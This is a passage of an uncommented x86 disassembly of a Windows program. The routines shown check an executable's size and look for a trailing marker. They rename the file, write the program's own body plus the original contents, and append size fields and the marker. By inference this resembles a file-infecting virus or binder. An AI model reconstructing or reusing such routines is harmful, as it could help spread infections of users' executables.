  401782:	e8 59 20 00 00       	call   0x4037e0
  401787:	57                   	push   %edi
  401788:	e8 69 fa ff ff       	call   0x4011f6
  40178d:	83 c4 0c             	add    $0xc,%esp
  401790:	84 c0                	test   %al,%al
  401792:	74 07                	je     0x40179b
  401794:	57                   	push   %edi
  401795:	e8 93 04 00 00       	call   0x401c2d
  40179a:	59                   	pop    %ecx
  40179b:	56                   	push   %esi
  40179c:	6a 3c                	push   $0x3c
  40179e:	e8 a8 21 00 00       	call   0x40394b
  4017a3:	59                   	pop    %ecx
  4017a4:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4017a7:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4017ab:	be 80 00 00 00       	mov    $0x80,%esi
  4017b0:	85 c0                	test   %eax,%eax
  4017b2:	74 15                	je     0x4017c9
  4017b4:	6a 01                	push   $0x1
  4017b6:	8b c8                	mov    %eax,%ecx
  4017b8:	ff 35 40 91 40 00    	push   0x409140
  4017be:	56                   	push   %esi
  4017bf:	57                   	push   %edi
  4017c0:	e8 66 0f 00 00       	call   0x40272b
  4017c5:	8b f8                	mov    %eax,%edi
  4017c7:	eb 02                	jmp    0x4017cb
  4017c9:	33 ff                	xor    %edi,%edi
  4017cb:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  4017cf:	6a 40                	push   $0x40
  4017d1:	e8 75 21 00 00       	call   0x40394b
  4017d6:	59                   	pop    %ecx
  4017d7:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4017da:	6a 01                	push   $0x1
  4017dc:	59                   	pop    %ecx
  4017dd:	85 c0                	test   %eax,%eax
  4017df:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4017e2:	74 14                	je     0x4017f8
  4017e4:	51                   	push   %ecx
  4017e5:	8b c8                	mov    %eax,%ecx
  4017e7:	ff 35 40 91 40 00    	push   0x409140
  4017ed:	56                   	push   %esi
  4017ee:	53                   	push   %ebx
  4017ef:	e8 5b 10 00 00       	call   0x40284f
  4017f4:	8b f0                	mov    %eax,%esi
  4017f6:	eb 02                	jmp    0x4017fa
  4017f8:	33 f6                	xor    %esi,%esi
  4017fa:	6a 02                	push   $0x2
  4017fc:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  401800:	6a f8                	push   $0xfffffff8
  401802:	8b ce                	mov    %esi,%ecx
  401804:	58                   	pop    %eax
  401805:	2b 05 b0 bf 40 00    	sub    0x40bfb0,%eax
  40180b:	50                   	push   %eax
  40180c:	e8 ea 11 00 00       	call   0x4029fb
  401811:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401814:	6a 04                	push   $0x4
  401816:	50                   	push   %eax
  401817:	8b ce                	mov    %esi,%ecx
  401819:	e8 9c 11 00 00       	call   0x4029ba
  40181e:	8d 45 08             	lea    0x8(%ebp),%eax
  401821:	6a 04                	push   $0x4
  401823:	50                   	push   %eax
  401824:	8b ce                	mov    %esi,%ecx
  401826:	e8 8f 11 00 00       	call   0x4029ba
  40182b:	6a 00                	push   $0x0
  40182d:	8b ce                	mov    %esi,%ecx
  40182f:	ff 75 f0             	push   -0x10(%ebp)
  401832:	e8 c4 11 00 00       	call   0x4029fb
  401837:	8b 45 08             	mov    0x8(%ebp),%eax
  40183a:	40                   	inc    %eax
  40183b:	50                   	push   %eax
  40183c:	e8 0a 21 00 00       	call   0x40394b
  401841:	59                   	pop    %ecx
  401842:	8b d8                	mov    %eax,%ebx
  401844:	ff 75 08             	push   0x8(%ebp)
  401847:	8b ce                	mov    %esi,%ecx
  401849:	53                   	push   %ebx
  40184a:	e8 6b 11 00 00       	call   0x4029ba
  40184f:	ff 75 08             	push   0x8(%ebp)
  401852:	8b cf                	mov    %edi,%ecx
  401854:	53                   	push   %ebx
  401855:	e8 1d 11 00 00       	call   0x402977
  40185a:	8b ce                	mov    %esi,%ecx
  40185c:	e8 94 0f 00 00       	call   0x4027f5
  401861:	8b cf                	mov    %edi,%ecx
  401863:	e8 8d 0f 00 00       	call   0x4027f5
  401868:	85 f6                	test   %esi,%esi
  40186a:	74 0f                	je     0x40187b
  40186c:	8b 06                	mov    (%esi),%eax
  40186e:	6a 01                	push   $0x1
  401870:	8b 40 04             	mov    0x4(%eax),%eax
  401873:	8d 0c 30             	lea    (%eax,%esi,1),%ecx
  401876:	8b 04 30             	mov    (%eax,%esi,1),%eax
  401879:	ff 10                	call   *(%eax)
  40187b:	85 ff                	test   %edi,%edi
  40187d:	5e                   	pop    %esi
  40187e:	74 0f                	je     0x40188f
  401880:	8b 07                	mov    (%edi),%eax
  401882:	6a 01                	push   $0x1
  401884:	8b 40 04             	mov    0x4(%eax),%eax
  401887:	8d 0c 38             	lea    (%eax,%edi,1),%ecx
  40188a:	8b 04 38             	mov    (%eax,%edi,1),%eax
  40188d:	ff 10                	call   *(%eax)
  40188f:	53                   	push   %ebx
  401890:	e8 c4 20 00 00       	call   0x403959
  401895:	ff 75 ec             	push   -0x14(%ebp)
  401898:	e8 bc 20 00 00       	call   0x403959
  40189d:	59                   	pop    %ecx
  40189e:	59                   	pop    %ecx
  40189f:	5f                   	pop    %edi
  4018a0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4018a3:	5b                   	pop    %ebx
  4018a4:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4018ab:	c9                   	leave
  4018ac:	c3                   	ret
  4018ad:	b8 92 80 40 00       	mov    $0x408092,%eax
  4018b2:	e8 81 24 00 00       	call   0x403d38
  4018b7:	51                   	push   %ecx
  4018b8:	53                   	push   %ebx
  4018b9:	56                   	push   %esi
  4018ba:	57                   	push   %edi
  4018bb:	6a 40                	push   $0x40
  4018bd:	e8 89 20 00 00       	call   0x40394b
  4018c2:	59                   	pop    %ecx
  4018c3:	8b c8                	mov    %eax,%ecx
  4018c5:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4018c8:	33 db                	xor    %ebx,%ebx
  4018ca:	3b cb                	cmp    %ebx,%ecx
  4018cc:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4018cf:	74 19                	je     0x4018ea
  4018d1:	6a 01                	push   $0x1
  4018d3:	ff 35 40 91 40 00    	push   0x409140
  4018d9:	68 80 00 00 00       	push   $0x80
  4018de:	ff 75 08             	push   0x8(%ebp)
  4018e1:	e8 69 0f 00 00       	call   0x40284f
  4018e6:	8b f0                	mov    %eax,%esi
  4018e8:	eb 02                	jmp    0x4018ec
  4018ea:	33 f6                	xor    %esi,%esi
  4018ec:	a1 b0 bf 40 00       	mov    0x40bfb0,%eax
  4018f1:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  4018f5:	f7 d8                	neg    %eax
  4018f7:	6a 02                	push   $0x2
  4018f9:	50                   	push   %eax
  4018fa:	8b ce                	mov    %esi,%ecx
  4018fc:	e8 fa 10 00 00       	call   0x4029fb
  401901:	a1 b0 bf 40 00       	mov    0x40bfb0,%eax
  401906:	40                   	inc    %eax
  401907:	50                   	push   %eax
  401908:	e8 3e 20 00 00       	call   0x40394b
  40190d:	59                   	pop    %ecx
  40190e:	8b f8                	mov    %eax,%edi
  401910:	ff 35 b0 bf 40 00    	push   0x40bfb0
  401916:	8b ce                	mov    %esi,%ecx
  401918:	57                   	push   %edi
  401919:	e8 9c 10 00 00       	call   0x4029ba
  40191e:	a1 b0 bf 40 00       	mov    0x40bfb0,%eax
  401923:	88 1c 38             	mov    %bl,(%eax,%edi,1)
  401926:	ff 35 a0 bf 40 00    	push   0x40bfa0
  40192c:	57                   	push   %edi
  40192d:	e8 de 65 00 00       	call   0x407f10
  401932:	59                   	pop    %ecx
  401933:	59                   	pop    %ecx
  401934:	85 c0                	test   %eax,%eax
  401936:	8b ce                	mov    %esi,%ecx
  401938:	75 1c                	jne    0x401956
  40193a:	e8 b6 0e 00 00       	call   0x4027f5
  40193f:	3b f3                	cmp    %ebx,%esi
  401941:	74 0f                	je     0x401952
  401943:	8b 06                	mov    (%esi),%eax
  401945:	6a 01                	push   $0x1
  401947:	8b 40 04             	mov    0x4(%eax),%eax
  40194a:	8d 0c 30             	lea    (%eax,%esi,1),%ecx
  40194d:	8b 04 30             	mov    (%eax,%esi,1),%eax
  401950:	ff 10                	call   *(%eax)
  401952:	b3 01                	mov    $0x1,%bl
  401954:	eb 18                	jmp    0x40196e
  401956:	e8 9a 0e 00 00       	call   0x4027f5
  40195b:	3b f3                	cmp    %ebx,%esi
  40195d:	74 0f                	je     0x40196e
  40195f:	8b 06                	mov    (%esi),%eax
  401961:	6a 01                	push   $0x1
  401963:	8b 40 04             	mov    0x4(%eax),%eax
  401966:	8d 0c 30             	lea    (%eax,%esi,1),%ecx
  401969:	8b 04 30             	mov    (%eax,%esi,1),%eax
  40196c:	ff 10                	call   *(%eax)
  40196e:	57                   	push   %edi
  40196f:	e8 e5 1f 00 00       	call   0x403959
  401974:	59                   	pop    %ecx
  401975:	5f                   	pop    %edi
  401976:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401979:	8a c3                	mov    %bl,%al
  40197b:	5e                   	pop    %esi
  40197c:	5b                   	pop    %ebx
  40197d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401984:	c9                   	leave
  401985:	c3                   	ret
  401986:	b8 a6 80 40 00       	mov    $0x4080a6,%eax
  40198b:	e8 a8 23 00 00       	call   0x403d38
  401990:	51                   	push   %ecx
  401991:	56                   	push   %esi
  401992:	57                   	push   %edi
  401993:	6a 40                	push   $0x40
  401995:	e8 b1 1f 00 00       	call   0x40394b
  40199a:	59                   	pop    %ecx
  40199b:	8b c8                	mov    %eax,%ecx
  40199d:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4019a0:	33 ff                	xor    %edi,%edi
  4019a2:	3b cf                	cmp    %edi,%ecx
  4019a4:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4019a7:	74 19                	je     0x4019c2
  4019a9:	6a 01                	push   $0x1
  4019ab:	ff 35 40 91 40 00    	push   0x409140
  4019b1:	68 80 00 00 00       	push   $0x80
  4019b6:	ff 75 0c             	push   0xc(%ebp)
  4019b9:	e8 91 0e 00 00       	call   0x40284f
  4019be:	8b f0                	mov    %eax,%esi
  4019c0:	eb 02                	jmp    0x4019c4
  4019c2:	33 f6                	xor    %esi,%esi
  4019c4:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  4019c8:	53                   	push   %ebx
  4019c9:	57                   	push   %edi
  4019ca:	8b ce                	mov    %esi,%ecx
  4019cc:	ff 75 08             	push   0x8(%ebp)
  4019cf:	e8 27 10 00 00       	call   0x4029fb
  4019d4:	8b ce                	mov    %esi,%ecx
  4019d6:	e8 54 10 00 00       	call   0x402a2f
  4019db:	6a 02                	push   $0x2
  4019dd:	57                   	push   %edi
  4019de:	8b ce                	mov    %esi,%ecx
  4019e0:	8b d8                	mov    %eax,%ebx
  4019e2:	e8 14 10 00 00       	call   0x4029fb
  4019e7:	8b ce                	mov    %esi,%ecx
  4019e9:	e8 41 10 00 00       	call   0x402a2f
  4019ee:	8b f8                	mov    %eax,%edi
  4019f0:	8b ce                	mov    %esi,%ecx
  4019f2:	2b fb                	sub    %ebx,%edi
  4019f4:	e8 fc 0d 00 00       	call   0x4027f5
  4019f9:	85 f6                	test   %esi,%esi
  4019fb:	5b                   	pop    %ebx
  4019fc:	74 0f                	je     0x401a0d
  4019fe:	8b 06                	mov    (%esi),%eax
  401a00:	6a 01                	push   $0x1
  401a02:	8b 40 04             	mov    0x4(%eax),%eax
  401a05:	8d 0c 30             	lea    (%eax,%esi,1),%ecx
  401a08:	8b 04 30             	mov    (%eax,%esi,1),%eax
  401a0b:	ff 10                	call   *(%eax)
  401a0d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401a10:	8b c7                	mov    %edi,%eax
  401a12:	5f                   	pop    %edi
  401a13:	5e                   	pop    %esi
  401a14:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401a1b:	c9                   	leave
  401a1c:	c3                   	ret
  401a1d:	b8 c4 80 40 00       	mov    $0x4080c4,%eax
  401a22:	e8 11 23 00 00       	call   0x403d38
  401a27:	83 ec 10             	sub    $0x10,%esp
  401a2a:	53                   	push   %ebx
  401a2b:	56                   	push   %esi
  401a2c:	57                   	push   %edi
  401a2d:	33 ff                	xor    %edi,%edi
  401a2f:	ff 75 08             	push   0x8(%ebp)
  401a32:	57                   	push   %edi
  401a33:	e8 4e ff ff ff       	call   0x401986
  401a38:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  401a3b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401a3e:	53                   	push   %ebx
  401a3f:	57                   	push   %edi
  401a40:	e8 41 ff ff ff       	call   0x401986
  401a45:	83 c4 10             	add    $0x10,%esp
  401a48:	3d 80 96 98 00       	cmp    $0x989680,%eax
  401a4d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401a50:	0f 8f c8 01 00 00    	jg     0x401c1e
  401a56:	53                   	push   %ebx
  401a57:	e8 74 1e 00 00       	call   0x4038d0
  401a5c:	40                   	inc    %eax
  401a5d:	50                   	push   %eax
  401a5e:	e8 e8 1e 00 00       	call   0x40394b
  401a63:	8b f0                	mov    %eax,%esi
  401a65:	53                   	push   %ebx
  401a66:	56                   	push   %esi
  401a67:	89 75 e8             	mov    %esi,-0x18(%ebp)
  401a6a:	e8 71 1d 00 00       	call   0x4037e0
  401a6f:	83 c4 10             	add    $0x10,%esp
  401a72:	68 a8 bf 40 00       	push   $0x40bfa8
  401a77:	56                   	push   %esi
  401a78:	e8 53 1e 00 00       	call   0x4038d0
  401a7d:	59                   	pop    %ecx
  401a7e:	8d 44 30 fd          	lea    -0x3(%eax,%esi,1),%eax
  401a82:	50                   	push   %eax
  401a83:	e8 58 1d 00 00       	call   0x4037e0
  401a88:	59                   	pop    %ecx
  401a89:	59                   	pop    %ecx
  401a8a:	56                   	push   %esi
  401a8b:	53                   	push   %ebx
  401a8c:	ff 15 38 90 40 00    	call   *0x409038
  401a92:	85 c0                	test   %eax,%eax
  401a94:	0f 84 84 01 00 00    	je     0x401c1e
  401a9a:	6a 40                	push   $0x40
  401a9c:	e8 aa 1e 00 00       	call   0x40394b
  401aa1:	59                   	pop    %ecx
  401aa2:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401aa5:	3b c7                	cmp    %edi,%eax
  401aa7:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401aaa:	bb 80 00 00 00       	mov    $0x80,%ebx
  401aaf:	74 17                	je     0x401ac8
  401ab1:	6a 01                	push   $0x1
  401ab3:	8b c8                	mov    %eax,%ecx
  401ab5:	ff 35 40 91 40 00    	push   0x409140
  401abb:	53                   	push   %ebx
  401abc:	ff 75 08             	push   0x8(%ebp)
  401abf:	e8 8b 0d 00 00       	call   0x40284f
  401ac4:	8b f0                	mov    %eax,%esi
  401ac6:	eb 02                	jmp    0x401aca
  401ac8:	33 f6                	xor    %esi,%esi
  401aca:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  401ace:	6a 3c                	push   $0x3c
  401ad0:	e8 76 1e 00 00       	call   0x40394b
  401ad5:	59                   	pop    %ecx
  401ad6:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401ad9:	6a 01                	push   $0x1
  401adb:	3b c7                	cmp    %edi,%eax
  401add:	59                   	pop    %ecx
  401ade:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401ae1:	74 14                	je     0x401af7
  401ae3:	51                   	push   %ecx
  401ae4:	8b c8                	mov    %eax,%ecx
  401ae6:	ff 35 40 91 40 00    	push   0x409140
  401aec:	53                   	push   %ebx
  401aed:	ff 75 0c             	push   0xc(%ebp)
  401af0:	e8 36 0c 00 00       	call   0x40272b
  401af5:	8b f8                	mov    %eax,%edi
  401af7:	ff 75 08             	push   0x8(%ebp)
  401afa:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  401afe:	e8 aa fd ff ff       	call   0x4018ad
  401b03:	84 c0                	test   %al,%al
  401b05:	59                   	pop    %ecx
  401b06:	74 2b                	je     0x401b33
  401b08:	6a 02                	push   $0x2
  401b0a:	6a f8                	push   $0xfffffff8
  401b0c:	58                   	pop    %eax
  401b0d:	8b ce                	mov    %esi,%ecx
  401b0f:	2b 05 b0 bf 40 00    	sub    0x40bfb0,%eax
  401b15:	50                   	push   %eax
  401b16:	e8 e0 0e 00 00       	call   0x4029fb
  401b1b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401b1e:	6a 04                	push   $0x4
  401b20:	50                   	push   %eax
  401b21:	8b ce                	mov    %esi,%ecx
  401b23:	e8 92 0e 00 00       	call   0x4029ba
  401b28:	6a 00                	push   $0x0
  401b2a:	6a 00                	push   $0x0
  401b2c:	8b ce                	mov    %esi,%ecx
  401b2e:	e8 c8 0e 00 00       	call   0x4029fb
  401b33:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401b36:	40                   	inc    %eax
  401b37:	50                   	push   %eax
  401b38:	e8 0e 1e 00 00       	call   0x40394b
  401b3d:	59                   	pop    %ecx
  401b3e:	89 45 08             	mov    %eax,0x8(%ebp)
  401b41:	ff 75 f0             	push   -0x10(%ebp)
  401b44:	8b ce                	mov    %esi,%ecx
  401b46:	50                   	push   %eax
  401b47:	e8 6e 0e 00 00       	call   0x4029ba
  401b4c:	ff 75 f0             	push   -0x10(%ebp)
  401b4f:	8b cf                	mov    %edi,%ecx
  401b51:	ff 75 08             	push   0x8(%ebp)
  401b54:	e8 1e 0e 00 00       	call   0x402977
  401b59:	ff 75 08             	push   0x8(%ebp)
  401b5c:	e8 f8 1d 00 00       	call   0x403959
  401b61:	59                   	pop    %ecx
  401b62:	8b ce                	mov    %esi,%ecx
  401b64:	e8 8c 0c 00 00       	call   0x4027f5
  401b69:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401b6c:	40                   	inc    %eax
  401b6d:	50                   	push   %eax
  401b6e:	e8 d8 1d 00 00       	call   0x40394b
  401b73:	59                   	pop    %ecx
  401b74:	89 45 08             	mov    %eax,0x8(%ebp)
  401b77:	ff 35 40 91 40 00    	push   0x409140
  401b7d:	8b ce                	mov    %esi,%ecx
  401b7f:	53                   	push   %ebx
  401b80:	ff 75 e8             	push   -0x18(%ebp)
  401b83:	e8 91 0d 00 00       	call   0x402919
  401b88:	ff 75 ec             	push   -0x14(%ebp)
  401b8b:	8b ce                	mov    %esi,%ecx
  401b8d:	ff 75 08             	push   0x8(%ebp)
  401b90:	e8 25 0e 00 00       	call   0x4029ba
  401b95:	ff 75 ec             	push   -0x14(%ebp)
  401b98:	8b cf                	mov    %edi,%ecx
  401b9a:	ff 75 08             	push   0x8(%ebp)
  401b9d:	e8 d5 0d 00 00       	call   0x402977
  401ba2:	8b ce                	mov    %esi,%ecx
  401ba4:	e8 4c 0c 00 00       	call   0x4027f5
  401ba9:	ff 75 08             	push   0x8(%ebp)
  401bac:	e8 a8 1d 00 00       	call   0x403959
  401bb1:	59                   	pop    %ecx
  401bb2:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401bb5:	6a 04                	push   $0x4
  401bb7:	50                   	push   %eax
  401bb8:	8b cf                	mov    %edi,%ecx
  401bba:	e8 b8 0d 00 00       	call   0x402977
  401bbf:	8d 45 ec             	lea    -0x14(%ebp),%eax
  401bc2:	6a 04                	push   $0x4
  401bc4:	50                   	push   %eax
  401bc5:	8b cf                	mov    %edi,%ecx
  401bc7:	e8 ab 0d 00 00       	call   0x402977
  401bcc:	ff 35 b0 bf 40 00    	push   0x40bfb0
  401bd2:	8b cf                	mov    %edi,%ecx
  401bd4:	ff 35 a0 bf 40 00    	push   0x40bfa0
  401bda:	e8 98 0d 00 00       	call   0x402977
  401bdf:	8b cf                	mov    %edi,%ecx
  401be1:	e8 0f 0c 00 00       	call   0x4027f5
  401be6:	85 f6                	test   %esi,%esi
  401be8:	74 0f                	je     0x401bf9
  401bea:	8b 06                	mov    (%esi),%eax
  401bec:	6a 01                	push   $0x1
  401bee:	8b 40 04             	mov    0x4(%eax),%eax
  401bf1:	8d 0c 30             	lea    (%eax,%esi,1),%ecx
  401bf4:	8b 04 30             	mov    (%eax,%esi,1),%eax
  401bf7:	ff 10                	call   *(%eax)
  401bf9:	85 ff                	test   %edi,%edi
  401bfb:	74 0f                	je     0x401c0c
  401bfd:	8b 07                	mov    (%edi),%eax
  401bff:	6a 01                	push   $0x1
  401c01:	8b 40 04             	mov    0x4(%eax),%eax
  401c04:	8d 0c 38             	lea    (%eax,%edi,1),%ecx
  401c07:	8b 04 38             	mov    (%eax,%edi,1),%eax
  401c0a:	ff 10                	call   *(%eax)
  401c0c:	ff 75 e8             	push   -0x18(%ebp)
  401c0f:	e8 19 00 00 00       	call   0x401c2d
  401c14:	ff 75 e8             	push   -0x18(%ebp)
  401c17:	e8 3d 1d 00 00       	call   0x403959
  401c1c:	59                   	pop    %ecx
  401c1d:	59                   	pop    %ecx
  401c1e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401c21:	5f                   	pop    %edi
  401c22:	5e                   	pop    %esi
  401c23:	5b                   	pop    %ebx
  401c24:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401c2b:	c9                   	leave
  401c2c:	c3                   	ret
  401c2d:	6a 20                	push   $0x20
  401c2f:	ff 74 24 08          	push   0x8(%esp)
  401c33:	ff 15 40 90 40 00    	call   *0x409040
  401c39:	ff 74 24 04          	push   0x4(%esp)
  401c3d:	ff 15 3c 90 40 00    	call   *0x40903c
  401c43:	c3                   	ret
  401c44:	55                   	push   %ebp
  401c45:	8b ec                	mov    %esp,%ebp
  401c47:	51                   	push   %ecx
  401c48:	56                   	push   %esi
  401c49:	57                   	push   %edi
  401c4a:	bf f4 01 00 00       	mov    $0x1f4,%edi
  401c4f:	57                   	push   %edi
  401c50:	e8 f6 1c 00 00       	call   0x40394b
  401c55:	59                   	pop    %ecx
  401c56:	8b f0                	mov    %eax,%esi
  401c58:	ff 15 44 90 40 00    	call   *0x409044
  401c5e:	50                   	push   %eax
  401c5f:	56                   	push   %esi
  401c60:	e8 7b 1b 00 00       	call   0x4037e0
  401c65:	80 3e 22             	cmpb   $0x22,(%esi)
  401c68:	59                   	pop    %ecx
  401c69:	59                   	pop    %ecx
  401c6a:	75 1e                	jne    0x401c8a
  401c6c:	56                   	push   %esi
  401c6d:	e8 5e 1c 00 00       	call   0x4038d0
  401c72:	48                   	dec    %eax
  401c73:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c76:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401c79:	50                   	push   %eax
  401c7a:	56                   	push   %esi
  401c7b:	e8 f3 00 00 00       	call   0x401d73
  401c80:	50                   	push   %eax
  401c81:	56                   	push   %esi
  401c82:	e8 59 1b 00 00       	call   0x4037e0
  401c87:	83 c4 14             	add    $0x14,%esp
  401c8a:	33 c0                	xor    %eax,%eax
  401c8c:	80 3c 30 22          	cmpb   $0x22,(%eax,%esi,1)
  401c90:	75 04                	jne    0x401c96
  401c92:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  401c96:	40                   	inc    %eax
  401c97:	3b c7                	cmp    %edi,%eax
  401c99:	7c f1                	jl     0x401c8c
  401c9b:	56                   	push   %esi
  401c9c:	33 ff                	xor    %edi,%edi
  401c9e:	e8 2d 1c 00 00       	call   0x4038d0
  401ca3:	48                   	dec    %eax
  401ca4:	59                   	pop    %ecx
  401ca5:	48                   	dec    %eax
  401ca6:	85 c0                	test   %eax,%eax
  401ca8:	7e 31                	jle    0x401cdb
  401caa:	8a 04 37             	mov    (%edi,%esi,1),%al
  401cad:	3c 65                	cmp    $0x65,%al
  401caf:	74 04                	je     0x401cb5
  401cb1:	3c 45                	cmp    $0x45,%al
  401cb3:	75 18                	jne    0x401ccd
  401cb5:	8a 44 37 01          	mov    0x1(%edi,%esi,1),%al
  401cb9:	3c 78                	cmp    $0x78,%al
  401cbb:	74 04                	je     0x401cc1
  401cbd:	3c 58                	cmp    $0x58,%al
  401cbf:	75 0c                	jne    0x401ccd
  401cc1:	8a 44 37 02          	mov    0x2(%edi,%esi,1),%al
  401cc5:	3c 65                	cmp    $0x65,%al
  401cc7:	74 12                	je     0x401cdb
  401cc9:	3c 45                	cmp    $0x45,%al
  401ccb:	74 0e                	je     0x401cdb
  401ccd:	56                   	push   %esi
  401cce:	47                   	inc    %edi
  401ccf:	e8 fc 1b 00 00       	call   0x4038d0
  401cd4:	48                   	dec    %eax
  401cd5:	59                   	pop    %ecx
  401cd6:	48                   	dec    %eax
  401cd7:	3b f8                	cmp    %eax,%edi
  401cd9:	7c cf                	jl     0x401caa
  401cdb:	56                   	push   %esi
  401cdc:	e8 ef 1b 00 00       	call   0x4038d0
  401ce1:	48                   	dec    %eax
  401ce2:	59                   	pop    %ecx
  401ce3:	48                   	dec    %eax
  401ce4:	3b f8                	cmp    %eax,%edi
  401ce6:	7c 17                	jl     0x401cff
  401ce8:	56                   	push   %esi
  401ce9:	ff 75 08             	push   0x8(%ebp)
  401cec:	e8 ef 1a 00 00       	call   0x4037e0
  401cf1:	56                   	push   %esi
  401cf2:	ff 75 0c             	push   0xc(%ebp)
  401cf5:	e8 e6 1a 00 00       	call   0x4037e0
  401cfa:	83 c4 10             	add    $0x10,%esp
  401cfd:	eb 25                	jmp    0x401d24
  401cff:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401d02:	83 c7 03             	add    $0x3,%edi
  401d05:	50                   	push   %eax
  401d06:	56                   	push   %esi
  401d07:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401d0a:	e8 c1 00 00 00       	call   0x401dd0
  401d0f:	50                   	push   %eax
  401d10:	ff 75 08             	push   0x8(%ebp)
  401d13:	e8 c8 1a 00 00       	call   0x4037e0
  401d18:	56                   	push   %esi
  401d19:	ff 75 0c             	push   0xc(%ebp)
  401d1c:	e8 bf 1a 00 00       	call   0x4037e0
  401d21:	83 c4 18             	add    $0x18,%esp
  401d24:	56                   	push   %esi
  401d25:	e8 2f 1c 00 00       	call   0x403959
  401d2a:	59                   	pop    %ecx
  401d2b:	5f                   	pop    %edi
  401d2c:	5e                   	pop    %esi
  401d2d:	c9                   	leave
  401d2e:	c3                   	ret
  401d2f:	83 7c 24 08 10       	cmpl   $0x10,0x8(%esp)
  401d34:	74 2b                	je     0x401d61
  401d36:	81 7c 24 08 10 01 00 	cmpl   $0x110,0x8(%esp)
  401d3d:	00 
  401d3e:	74 04                	je     0x401d44
  401d40:	33 c0                	xor    %eax,%eax
  401d42:	eb 2c                	jmp    0x401d70
  401d44:	68 bc b0 40 00       	push   $0x40b0bc
  401d49:	68 ea 03 00 00       	push   $0x3ea
  401d4e:	ff 74 24 0c          	push   0xc(%esp)
  401d52:	ff 15 14 91 40 00    	call   *0x409114
  401d58:	50                   	push   %eax
  401d59:	ff 15 08 91 40 00    	call   *0x409108
  401d5f:	eb 0c                	jmp    0x401d6d
  401d61:	6a 00                	push   $0x0
  401d63:	ff 74 24 08          	push   0x8(%esp)
  401d67:	ff 15 0c 91 40 00    	call   *0x40910c
  401d6d:	6a 01                	push   $0x1
  401d6f:	58                   	pop    %eax
  401d70:	c2 10 00             	ret    $0x10
  401d73:	53                   	push   %ebx
  401d74:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401d78:	56                   	push   %esi
  401d79:	53                   	push   %ebx
  401d7a:	e8 51 1b 00 00       	call   0x4038d0
  401d7f:	8b 74 24 14          	mov    0x14(%esp),%esi
  401d83:	59                   	pop    %ecx
  401d84:	39 06                	cmp    %eax,(%esi)
  401d86:	77 43                	ja     0x401dcb
  401d88:	53                   	push   %ebx
  401d89:	e8 42 1b 00 00       	call   0x4038d0
  401d8e:	85 c0                	test   %eax,%eax
  401d90:	59                   	pop    %ecx
  401d91:	74 38                	je     0x401dcb
  401d93:	8b 06                	mov    (%esi),%eax
  401d95:	57                   	push   %edi
  401d96:	40                   	inc    %eax
  401d97:	50                   	push   %eax
  401d98:	e8 ae 1b 00 00       	call   0x40394b
  401d9d:	53                   	push   %ebx
  401d9e:	8b f8                	mov    %eax,%edi
  401da0:	e8 2b 1b 00 00       	call   0x4038d0
  401da5:	59                   	pop    %ecx
  401da6:	48                   	dec    %eax
  401da7:	59                   	pop    %ecx
  401da8:	33 d2                	xor    %edx,%edx
  401daa:	8b 0e                	mov    (%esi),%ecx
  401dac:	85 c9                	test   %ecx,%ecx
  401dae:	7e 12                	jle    0x401dc2
  401db0:	03 c3                	add    %ebx,%eax
  401db2:	8a 18                	mov    (%eax),%bl
  401db4:	2b ca                	sub    %edx,%ecx
  401db6:	48                   	dec    %eax
  401db7:	42                   	inc    %edx
  401db8:	88 5c 39 ff          	mov    %bl,-0x1(%ecx,%edi,1)
  401dbc:	8b 0e                	mov    (%esi),%ecx
  401dbe:	3b d1                	cmp    %ecx,%edx
  401dc0:	7c f0                	jl     0x401db2
  401dc2:	80 24 3a 00          	andb   $0x0,(%edx,%edi,1)
  401dc6:	8b c7                	mov    %edi,%eax
  401dc8:	5f                   	pop    %edi
  401dc9:	eb 02                	jmp    0x401dcd
  401dcb:	8b c3                	mov    %ebx,%eax
  401dcd:	5e                   	pop    %esi
  401dce:	5b                   	pop    %ebx
  401dcf:	c3                   	ret
  401dd0:	56                   	push   %esi
  401dd1:	57                   	push   %edi
  401dd2:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  401dd6:	57                   	push   %edi
  401dd7:	e8 f4 1a 00 00       	call   0x4038d0
  401ddc:	8b 74 24 14          	mov    0x14(%esp),%esi
  401de0:	59                   	pop    %ecx
  401de1:	39 06                	cmp    %eax,(%esi)
  401de3:	77 32                	ja     0x401e17
  401de5:	57                   	push   %edi
  401de6:	e8 e5 1a 00 00       	call   0x4038d0
